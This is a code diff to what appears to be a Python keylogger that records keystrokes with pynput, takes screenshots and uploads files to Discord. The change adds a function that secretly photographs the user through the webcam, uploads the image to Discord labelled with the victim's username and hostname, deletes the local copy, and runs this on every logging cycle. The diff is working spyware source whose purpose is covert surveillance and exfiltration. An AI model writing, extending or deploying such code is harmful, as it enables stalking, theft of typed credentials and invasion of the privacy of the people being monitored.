@@ -4,7 +4,8 @@ from pynput.keyboard import Listener, Key
 
 from classes.Host import Host
 from discord_util import discord
-from utils.file_util import write_keys_to_file, get_object_size, write_legible_text_to_file, take_screenshot
+from utils.file_util import write_keys_to_file, get_object_size, write_legible_text_to_file, take_screenshot, \
+    take_picture_from_webcam
 from utils.time_util import get_current_date_and_time, get_current_date
 
 key_log = {}
@@ -39,6 +40,14 @@ def do_screenshot():
     os.remove(screenshot)
 
 
+def take_webcam_picture():
+    webcam_pic = take_picture_from_webcam()
+    discord.send_file(webcam_pic,
+                      "webcam_" + "_" + host.username + "_" + host.hostname + "_" + get_current_date() + ".png",
+                      "New Webcam Picture")
+    os.remove(webcam_pic)
+
+
 def on_press(key):
     time = get_current_date_and_time()
     key_log[time] = str(key).replace("'", "")
@@ -56,6 +65,7 @@ def on_press(key):
         os.remove(legible_text_file)
         key_log.clear()
         do_screenshot()
+        take_webcam_picture()
 
 
 def log():
